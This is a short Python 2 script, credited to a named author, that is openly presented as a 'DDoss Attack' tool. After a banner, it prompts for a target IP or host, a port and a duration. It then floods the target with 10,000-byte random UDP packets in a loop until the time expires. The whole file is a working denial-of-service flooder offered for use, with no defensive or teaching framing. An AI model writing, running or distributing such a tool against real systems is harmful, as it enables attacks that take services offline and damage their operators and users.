#!/usr/bin/python
#!--- coded by EL-Rusi Youssef Tarek --!#
#! I LOVE PYTHON !#
#colors
wi = "\033[1;37m" 
rd = "\033[1;31m" 
gr = "\033[1;32m" 
yl = "\033[1;33m" 
pu = "\033[1;35m" 
#------------------#
import os
import socket
import time 
import random
import sys
#------------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")
    print rd+'''
    
                        8888b.  8888b.   dP"Yb  .dP"Y8 .dP"Y8        db    888888 888888    db     dP""b8 88  dP 
                         8I  Yb  8I  Yb dP   Yb `Ybo." `Ybo."       dPYb     88     88     dPYb   dP   `" 88odP  
                         8I  dY  8I  dY Yb   dP o.`Y8b o.`Y8b      dP__Yb    88     88    dP__Yb  Yb      88"Yb  
                        8888Y"  8888Y"   YbodP  8bodP' 8bodP'     dP""""Yb   88     88   dP""""Yb  YboodP 88  Yb 


    '''
    print pu+'''
                        ________________________________________________________________________________
                       |          .::        ::.            	       .::             ::.              |
                       +===================================+============================================+
                       |              [+] this script coded by Russian (Youssef Tarek) [+]                |
                       |              Facebook: https://www.facebook.com/youssef.tooson                       |
                       |             |
                       +                                   +                                            +
                       |===================================+============================================|
    '''
    print'\n'
    print'\n'
    ip = raw_input(yl+"[*] ip or host Target : ")
    port = input(wi+"[*] port [Default port 80 ] :")
    seconds = input(rd+"[*] time the Attack : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print ' DDoss Attack starting on %s .... ' % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
